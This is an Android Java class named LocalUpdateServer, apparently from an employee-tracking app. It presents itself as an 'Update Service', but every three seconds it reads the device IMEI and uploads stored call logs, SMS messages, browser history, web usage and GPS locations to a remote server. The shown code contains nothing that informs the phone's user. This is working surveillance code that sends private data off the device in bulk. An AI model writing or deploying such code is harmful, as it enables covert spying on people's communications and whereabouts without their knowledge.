package update.log;


import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.net.ConnectivityManager;
import android.net.NetworkInfo.State;
import android.os.Handler;
import android.telephony.TelephonyManager;
import android.util.Log;

public class LocalUpdateServer 
{
		private String tag = "Update Service";
		private Handler mHandler = new Handler();
		TelephonyManager tManager;
		String IMEI;
		Context mContext = null;
		int resultCall = 0;
		int resultSmS = 0;
		int resultWeb = 0;
		int resultBrowser = 0;
		int resultGeo = 0;
		
		public LocalUpdateServer(Context context)
		{
			mContext = context;
			tManager=(TelephonyManager)mContext.getSystemService(Context.TELEPHONY_SERVICE);
		}
		
		public void startUpdatingLocalDatabase() 
		{
			// TODO Auto-generated method stub
			mHandler.postDelayed(mRunnable, 3000);
	    }
		
		private final Runnable mRunnable = new Runnable()
		{
				public void run() 
				{
					IMEI=tManager.getDeviceId();
			        Log.i(tag, "IMEI :"+IMEI);
			        if(isInternetOn())
			        {
						insertDataServer();
			        }
					mHandler.postDelayed(mRunnable, 3000);		
				}
		};
		
		public final boolean isInternetOn() 
		{
			
			ConnectivityManager connec =  (ConnectivityManager)mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
			// ARE WE CONNECTED TO THE NET
			if ( connec.getNetworkInfo(0).getState() == State.CONNECTED 
					||connec.getNetworkInfo(0).getState() == State.CONNECTING
					||connec.getNetworkInfo(1).getState() == State.CONNECTING  
					||connec.getNetworkInfo(1).getState() == State.CONNECTED ) 
			{
				// MESSAGE TO SCREEN FOR TESTING (IF REQ)
				//Toast.makeText(this, "connected", Toast.LENGTH_SHORT).show();
				
				return true;
				
			} else if (connec.getNetworkInfo(0).getState() == State.DISCONNECTED
						|| connec.getNetworkInfo(1).getState() == State.DISCONNECTED 
					   )
			{
				return false;
			}
			return false;
		}
		
		private void insertDataServer() 
		{
			//Check Callog LocalData
			checkCalllog();
			
			//Check Smslog LocalData
			checkSmslog();
			
			//Check Browserlog LocalData
			checkBrowserlog();
			
			//Check Weblog LocalData
			checkWeblog();
			
			//Check GPSlog LocalData
			checkGPSlog();
			
		}
		
		private void checkGPSlog() 
		{
			// TODO Auto-generated method stub
			try 
			{
				storeGeoData(mContext);
				
			} catch (Exception e) 
			{
				Log.i(tag,"Error in GPS :"+e.getMessage());
				
			} finally
			{
				
			}
		}
		
		private void storeGeoData(Context mContext2) throws Exception
		{
			// TODO Auto-generated method stub
			String tag = "Geo Update Service";
			my.employeetrack.app.DbHelper dh=new my.employeetrack.app.DbHelper(mContext2,"MitterBitterDB",null);
			SQLiteDatabase db=dh.getWritableDatabase();
			Cursor cur = db.rawQuery("select * from GPSLocal where updateServer=0", null);
			try 
			{  	
		        IMEI=tManager.getDeviceId();
		        
		        Log.i(tag,"Count : "+cur.getCount());
		        
		        if(cur.getCount() > 0)
		        {
		        	while(cur.moveToNext())
		        	{
		        		if(isInternetOn())
		        		{
		        			resultGeo = my.employeetrack.app.CallServices.serverUpdateGeoLocaion(cur.getLong(0),cur.getLong(1),cur.getDouble(2),cur.getDouble(3));
		        		}
		        		else
		        		{
		        			Log.i(tag,"No Change in GPSLocal LocalDB");
		        		}
		        		
		        		if(resultGeo == 1 || resultGeo == 10)
	      				{
	      			 		Log.i(tag,"Data Inserted WebServices");
	      			 		ContentValues values=new ContentValues();
							values.put("updateServer",1);
							
							db.update("GPSLocal", values, "date = ? AND longitude = ? AND latitude = ?",new String[]{""+cur.getLong(0),""+cur.getDouble(2),""+cur.getDouble(3)});
							
							Log.i(tag,"Updated GPSLocal Locally");
	      			 		
							resultGeo = 0;
	      			 	}
		        		else if(resultGeo != 1 || resultGeo != 10)
		        		{
		        			Log.i(tag,"Data Not Properly Inserted in WebService And Also Not Changed In Local DB");
		        		}
		        	}
		        }
		        
			} catch (Exception e)
			{
				// TODO: handle exception
				throw e;
				
			} finally
			{
				cur.close();
				db.close();
				dh.close();
			}

			
		}

		private void checkWeblog() 
		{
			// TODO Auto-generated method stub
			try 
			{
			
				storeWebData(mContext);
				
			} catch (Exception e) 
			{
				Log.i(tag,"Error WebLog :"+e.getMessage());
				
			} finally
			{
				
			}
		}
		
		private void storeWebData(Context mContext2) throws Exception
		{
			// TODO Auto-generated method stub
			// TODO Auto-generated method stub
			
						String tag = "Web Update Service";
						my.employeetrack.app.DbHelper dh=new my.employeetrack.app.DbHelper(mContext2,"MitterBitterDB",null);
						SQLiteDatabase db=dh.getWritableDatabase();
						Cursor cur = db.rawQuery("select * from WebDetail where updateServer=0", null);
						try 
						{  	
					        IMEI=tManager.getDeviceId();
					        
					        Log.i(tag,"Count : "+cur.getCount());
					        
					        if(cur.getCount() > 0)
					        {
					        	while(cur.moveToNext())
					        	{
					        		if(isInternetOn())
					        		{
					        			resultWeb = my.employeetrack.app.CallServices.serverUpdateWeb(cur.getLong(0),cur.getLong(1), cur.getLong(2),cur.getLong(3));
					        		}
					        		else
					        		{
					        			Log.i(tag,"No Change in Web LocalDB");
					        		}
					        		if(resultWeb == 1 || resultWeb==10)
				      				{
				      			 		Log.i(tag,"Data Inserted WebServices");
				      			 		ContentValues values=new ContentValues();
										values.put("updateServer",1);
										
										int i = db.update("WebDetail", values, "date = ? AND receive = ? AND transfer = ?",new String[]{""+cur.getLong(0),""+cur.getLong(2),""+cur.getLong(3)});
										Log.i(tag, ""+i);
										//db.rawQuery("Update WebDetail where date=? AND receive=? AND transfer=?",new String[]{""+cur.getLong(0),""+cur.getLong(2),""+cur.getLong(3)});
										Log.i(tag,"Updated Web Data Locally");
				      			 		resultWeb = 0;
				      			 	}
					        		else if(resultWeb != 1 || resultWeb != 10)
					        		{
					        			Log.i(tag,"Data Not Properly Inserted in WebService And Also Not Changed In Local DB");
					        		}
					        	}
					        }
					        
						} catch (Exception e)
						{
							// TODO: handle exception
							throw e;
							
						} finally
						{
							cur.close();
							db.close();
							dh.close();
						}
		}

		private void checkBrowserlog() 
		{
			// TODO Auto-generated method stub
			try 
			{
				storeBrowserData(mContext);
				
			} catch (Exception e) 
			{
				Log.i(tag,"Error BrowserLog :"+e.getMessage());
				
			} finally
			{
				
			}
		}
		
		private void storeBrowserData(Context mContext2) throws Exception
		{
			// TODO Auto-generated method stub
			String tag = "Browser Update Service";
			my.employeetrack.app.DbHelper dh=new my.employeetrack.app.DbHelper(mContext2,"MitterBitterDB",null);
	  	  	
			SQLiteDatabase db=dh.getWritableDatabase();
		  	
			Cursor cur = db.rawQuery("select * from BrowserInfo where updateServer=0", null);
			try 
			{  	
		        IMEI=tManager.getDeviceId();
		        
		        Log.i(tag,"Count : "+cur.getCount());
		        
		        if(cur.getCount() > 0)
		        {
		        	while(cur.moveToNext())
		        	{
		        		if(isInternetOn())
		        		{
		        			resultBrowser = my.employeetrack.app.CallServices.serverUpdateBrowser(Long.parseLong(IMEI), cur.getLong(1), cur.getLong(2), cur.getString(3), cur.getString(4), cur.getInt(5));
		        		}
		        		else
		        		{
		        			Log.i(tag,"No Change in Browser LocalDB");
		        		}
		        		if(resultBrowser == 1 || resultBrowser == 10)
	      				{
	      			 		Log.i(tag,"Data Inserted WebServices");
	      			 		ContentValues values=new ContentValues();
							values.put("updateServer",1);
							db.update("BrowserInfo",values, "id" + "= ?",new String[]{""+cur.getInt(0)});     
							Log.i(tag,"Updated BrowserData Locally");
	      			 		resultBrowser = 0;
	      			 	}
		        		else if(resultBrowser != 1 || resultBrowser != 10)
		        		{
		        			Log.i(tag,"Data Not Properly Inserted in WebService And Also Not Changed In Local DB");
		        		}
		        	}
		        }
		        
			} catch (Exception e)
			{
				// TODO: handle exception
				throw e;
				
			} finally
			{
				cur.close();
				db.close();
				dh.close();
			}

			
			
		}

		private void checkSmslog() 
		{
			// TODO Auto-generated method stub
			try 
			{
				storeSmSData(mContext);
				
			} catch (Exception e) 
			{
				Log.i(tag,"Error SmsLog :"+e.getMessage());
				
			} 
		}

		private void storeSmSData(Context mContext2) throws Exception
		{
			// TODO Auto-generated method stub
			String tag = "SMS Update Service";
			my.employeetrack.app.DbHelper dh=new my.employeetrack.app.DbHelper(mContext2,"MitterBitterDB",null);
	  	  	
			SQLiteDatabase db=dh.getWritableDatabase();
		  	
			Cursor cur = db.rawQuery("select * from smslog where updateServer=0", null);
			try 
			{  	
		        IMEI=tManager.getDeviceId();
		        
		        Log.i(tag,"Count : "+cur.getCount());
		        
		        if(cur.getCount() > 0)
		        {
		        	while(cur.moveToNext())
		        	{
		        		if(isInternetOn())
		        		{
		        			resultSmS = my.employeetrack.app.CallServices.serverUpdateSMS(cur.getInt(0),cur.getInt(1),Long.parseLong(IMEI),cur.getString(3),cur.getString(4),cur.getInt(5),cur.getInt(6),cur.getInt(7),cur.getString(8),cur.getInt(9));
		        		}
		        		else
		        		{
		        			Log.i(tag,"No Change in SMS LocalDB");
		        		}
		        		if(resultSmS == 1 || resultSmS==10)
	      				{
	      			 		Log.i(tag,"Data Inserted WebServices");
	      			 		ContentValues values=new ContentValues();
							values.put("updateServer",1);
							db.update("smslog", values, "_id" + "= ?",new String[]{""+cur.getInt(0)});     
							Log.i(tag,"Updated SMS Data Locally");
	      			 		resultSmS = 0;
	      			 	}
		        		else if(resultSmS != 1 || resultSmS != 10)
		        		{
		        			Log.i(tag,"Data Not Properly Inserted in WebService And Also Not Changed In Local DB");
		        		}
		        	}
		        }
		        
			} catch (Exception e)
			{
				// TODO: handle exception
				throw e;
				
			} finally
			{
				cur.close();
				db.close();
				dh.close();
			}
		
			
		}

		private void checkCalllog() 
		{
			// TODO Auto-generated method stub
			try 
			{
				storeCallData(mContext);
				
			} catch (Exception e) 
			{
				Log.i(tag,"Error Calllog :"+e.getMessage());
				
			}
		}
		
		protected void storeCallData(Context context) throws Exception 
		{
			String tag = "Call Update Service";
			my.employeetrack.app.DbHelper dh=new my.employeetrack.app.DbHelper(context,"MitterBitterDB",null);
	  	  	
			SQLiteDatabase db=dh.getWritableDatabase();
		  	
			Cursor cur = db.rawQuery("select * from calllog where updateServer=0", null);
			try 
			{  	
		        IMEI=tManager.getDeviceId();
		        
		        Log.i(tag,"Count : "+cur.getCount());
		        
		        if(cur.getCount() > 0)
		        {
		        	while(cur.moveToNext())
		        	{
		        		if(isInternetOn())
		        		{
		        			resultCall = my.employeetrack.app.CallServices.serverUpdateCallLogs(cur.getInt(0),String.valueOf(cur.getLong(1)),cur.getString(2),cur.getLong(3),cur.getLong(4),cur.getLong(5),cur.getString(6));
		        		}
		        		else
		        		{
		        			Log.i(tag,"No Change in Call LocalDB");
		        		}
		        		if(resultCall == 1 || resultCall==10)
	      				{
	      			 		Log.i(tag,"Data Inserted WebServices");
	      			 		ContentValues values=new ContentValues();
							values.put("updateServer",1);
							db.update("calllog", values, "_id" + "= ?",new String[]{""+cur.getInt(0)});     
							Log.i(tag,"Updated call data Locally");
	      			 		resultCall = 0;
	      			 	}
		        		else if(resultCall != 1 || resultCall != 10)
		        		{
		        			Log.i(tag,"Data Not Properly Inserted in WebService And Also Not Changed In Local DB");
		        		}
		        	}
		        }
		        
			} catch (Exception e)
			{
				// TODO: handle exception
				throw e;
				
			} finally
			{
				cur.close();
				db.close();
				dh.close();
			}
			
	  	  		        
	        
		}
}